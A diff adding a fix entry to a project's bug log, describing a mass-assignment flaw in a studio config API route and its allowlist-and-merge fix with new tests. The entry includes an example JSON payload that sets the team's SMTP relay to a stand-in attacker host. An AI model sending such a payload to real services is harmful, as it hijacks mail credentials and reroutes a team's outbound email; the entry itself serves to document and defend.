@@ -2848,6 +2848,39 @@ verify the `Deploy to Oracle VMs` run succeeds after merge.
   its timeline). 385/392 apps/web tests pass (3 new, 7 pre-existing
   unrelated skips), `tsc --noEmit` clean.
 
+- **OPEN-199 (Fixed):** mass-assignment credential-hijack via
+  `POST /api/studio/config` (`apps/api/routes/studio/config/route.ts`) —
+  the same bug OPEN-183 already fixed on its `apps/web` twin
+  (`apps/web/src/app/api/studio/config/route.ts`), but the `apps/api`
+  copy of this route was never touched by that fix. `Team.aiConfig` is a
+  shared JSON blob that also stores `smtpConfig` (the SMTP relay
+  host/user/password used for all of a team's outbound campaign email —
+  confirmed via `smtpConfigService.ts` reading `team.aiConfig.smtpConfig`)
+  and AI provider API keys, but this route wrote `data: { aiConfig: body
+  }` — the entire raw request body, wholesale, not even merged with the
+  existing value. **Exploit:** any authenticated member of Team A (no
+  permission gate beyond having a `teamId`) could POST `{"smtpConfig":
+  {"host": "smtp.attacker.example", "user": "attacker@evil.com",
+  "password": "hijacked"}}` and silently overwrite their own team's real
+  SMTP relay credentials, rerouting all subsequent outbound campaign
+  email through an attacker-controlled mail server — the identical
+  credential-hijack impact OPEN-183 described, just reachable through
+  the un-patched `apps/api` route instead of the already-fixed
+  `apps/web` one. It was also destructive even without malicious intent:
+  since the write was a full replace rather than a merge, any normal
+  tone-preference save silently wiped the team's real `smtpConfig`/
+  `apiKey`. **Fixed** by porting the identical known-good pattern already
+  in the `apps/web` sibling verbatim: an explicit
+  `STUDIO_PATCHABLE_FIELDS` allowlist (`formality`, `directness`,
+  `talkingPoints`, `avoidWords`), reading the existing `aiConfig` first
+  and merging only the allowlisted fields into it. New `route.test.ts`
+  added (first test file for this route; 3 tests, ported from the
+  `apps/web` sibling's own test file: existing `smtpConfig`/`apiKey`
+  preserved across an update, a caller-supplied `smtpConfig`/`apiKey` is
+  stripped rather than written through, unauthenticated caller rejected).
+  1043/1043 apps/api tests pass (3 new), `tsc --noEmit` clean (same
+  pre-existing, unrelated `browser-engine.ts` failure noted above).
+
 **Last Reconciled:** 2026-08-23 (**Session-wide production bug-hunting campaign 2026-08-21/23**: triggered by discovering the `/admin/audit` auth bug, which led to systematically re-checking every apps/api and apps/web route for the same bug classes — see OPEN-56 through OPEN-60 below. All fixed and merged/deployed except the manual PAT rotation owed to the user.)
 
 ---
